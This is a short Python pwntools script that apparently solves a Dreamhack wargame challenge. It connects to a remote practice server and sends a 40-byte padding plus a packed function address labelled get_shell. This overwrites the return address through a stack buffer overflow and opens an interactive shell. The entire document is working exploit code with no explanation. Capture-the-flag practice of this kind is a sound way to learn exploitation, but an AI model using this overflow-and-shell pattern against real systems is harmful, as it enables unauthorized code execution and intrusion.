from pwn import *

r = remote("host1.dreamhack.games", 21877)


get_shell = 0x804867B
payload = b"A"*40
payload += p32(get_shell)

r.sendline(payload)

r.interactive()